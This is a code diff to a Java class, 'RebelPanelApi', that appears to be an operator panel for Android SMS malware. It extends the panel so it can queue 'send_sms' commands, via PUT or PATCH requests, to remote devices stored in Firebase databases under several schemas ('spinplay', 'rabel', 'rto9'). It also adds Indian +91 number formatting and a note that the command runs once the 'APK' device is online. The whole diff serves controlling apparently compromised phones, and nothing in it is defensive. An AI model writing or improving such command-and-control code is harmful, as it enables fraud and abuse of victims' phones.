@@ -41,7 +41,7 @@ final class RebelPanelApi {
     static JSONObject sendSms(JSONObject body) {
         try {
             String deviceId = trim(body.optString("device_id"));
-            String to = normalizePhone(body.optString("to"));
+            String to = formatSmsTo(body.optString("to"));
             String message = trim(body.optString("message"));
             int sim = Math.max(1, body.optInt("sim", 1));
             String url = rtrim(trim(body.optString("database_url")), '/');
@@ -61,7 +61,9 @@ final class RebelPanelApi {
 
             for (SendAttempt attempt : attempts) {
                 JSONObject payload = sendPayloadForType(attempt.type, sim, to, message, deviceId);
-                JSONObject res = RebelFirebaseClient.request("PUT", url, authKey, attempt.path, payload);
+                String method = attempt.method != null && !attempt.method.isEmpty()
+                        ? attempt.method : "PUT";
+                JSONObject res = RebelFirebaseClient.request(method, url, authKey, attempt.path, payload);
                 if (res != null) {
                     String hint = "rto9".equals(attempt.type)
                             ? " Command queued — device must be online on APK to send."
@@ -214,9 +216,9 @@ final class RebelPanelApi {
         String node = deviceNode.isEmpty() ? "clients" : deviceNode;
         if ("spinplay".equals(schema)) {
             for (String n : unique(node, "devices", "clients", "Verify_Device")) {
-                out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay"));
+                out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
             }
-            out.add(new SendAttempt("clients/" + id + "/webhookEvent/sendSms", "rabel"));
+            out.add(new SendAttempt("clients/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
             return out;
         }
 
@@ -225,26 +227,30 @@ final class RebelPanelApi {
                 if (n.isEmpty()) {
                     continue;
                 }
-                out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay"));
-                out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel"));
-                out.add(new SendAttempt(n + "/" + id + "/commands/send_sms", "spinplay"));
+                out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
+                out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
+                out.add(new SendAttempt(n + "/" + id + "/commands/send_sms", "spinplay", "PUT"));
             }
             return out;
         }
 
+        if ("rabel".equals(schema) || "clients".equals(node)) {
+            out.add(new SendAttempt("clients/" + id, "rto9", "PATCH"));
+        }
+
         if (isRtoStyleUrl(url) || "user_list".equals(deviceNode) || "user_data".equals(deviceNode)) {
-            out.add(new SendAttempt("clients/" + id, "rto9"));
-            out.add(new SendAttempt(id, "rto9"));
-            out.add(new SendAttempt("clients/" + id + "/webhookEvent/sendSms", "rabel"));
-            out.add(new SendAttempt(id + "/webhookEvent/sendSms", "rabel"));
+            out.add(new SendAttempt("clients/" + id, "rto9", "PATCH"));
+            out.add(new SendAttempt(id, "rto9", "PATCH"));
+            out.add(new SendAttempt("clients/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
+            out.add(new SendAttempt(id + "/webhookEvent/sendSms", "rabel", "PUT"));
         }
         for (String n : unique("clients", node, "user_list", "user_data", "devices")) {
             if (n.isEmpty()) {
                 continue;
             }
-            out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel"));
+            out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
         }
-        out.add(new SendAttempt("devices/" + id + "/manual_commands/send_sms", "spinplay"));
+        out.add(new SendAttempt("devices/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
         return out;
     }
 
@@ -267,6 +273,8 @@ final class RebelPanelApi {
             payload.put("messageText", message);
             payload.put("msg", message);
             payload.put("phoneNumber", to);
+            payload.put("phone", to);
+            payload.put("number", to);
             payload.put("to", to);
 
             JSONObject sendSms = new JSONObject();
@@ -508,6 +516,20 @@ final class RebelPanelApi {
         return Pattern.compile("rto9|rto0|rto91", Pattern.CASE_INSENSITIVE).matcher(url).find();
     }
 
+    private static String formatSmsTo(String raw) {
+        String clean = raw.replaceAll("\\D", "");
+        if (clean.length() == 10) {
+            return "91" + clean;
+        }
+        if (clean.length() == 12 && clean.startsWith("91")) {
+            return clean;
+        }
+        if (clean.length() > 10) {
+            return "91" + clean.substring(clean.length() - 10);
+        }
+        return clean;
+    }
+
     private static String normalizePhone(String raw) {
         String clean = raw.replaceAll("\\D", "");
         if (clean.length() == 10) {
@@ -566,10 +588,16 @@ final class RebelPanelApi {
     private static final class SendAttempt {
         final String path;
         final String type;
+        final String method;
 
         SendAttempt(String path, String type) {
+            this(path, type, "PUT");
+        }
+
+        SendAttempt(String path, String type, String method) {
             this.path = path;
             this.type = type;
+            this.method = method;
         }
     }
 }
